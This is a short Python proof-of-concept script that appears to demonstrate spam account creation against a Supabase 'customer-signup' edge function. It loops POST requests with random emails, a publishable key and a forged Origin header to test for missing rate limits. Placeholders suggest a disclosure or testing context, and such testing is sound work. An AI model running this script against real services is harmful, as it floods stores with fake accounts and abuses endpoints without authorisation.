"""
POC 1: spam accounts creation on customer-signup route
"""

import random
import string
import time

import requests

ENDPOINT = "https://<PROJECT>.supabase.co/functions/v1/customer-signup"
KEY = "<PUBLISHABLE_KEY>"

HEADERS = {
    "Authorization": f"Bearer {KEY}",
    "apikey": KEY,
    "Content-Type": "application/json",
    "Origin": "https://<FRIEND_DOMAIN>",
}


def random_mail():
    name = "".join(random.choices(string.ascii_lowercase, k=10))
    return f"{name}@example-test.invalid"


def attempt():
    return requests.post(
        ENDPOINT,
        headers=HEADERS,
        json={
            "store_id": "<STORE_ID>",
            "full_name": "Test",
            "email": random_mail(),
            "phone": "910000000000",
            "password": "TestPass123!",
        },
        timeout=10,
    )


def main(count=20, delay=0.3):
    for i in range(count):
        r = attempt()
        print(f"  [{i+1:02d}] {r.status_code}  {r.text[:80]}")
        time.sleep(delay)


if __name__ == "__main__":
    main()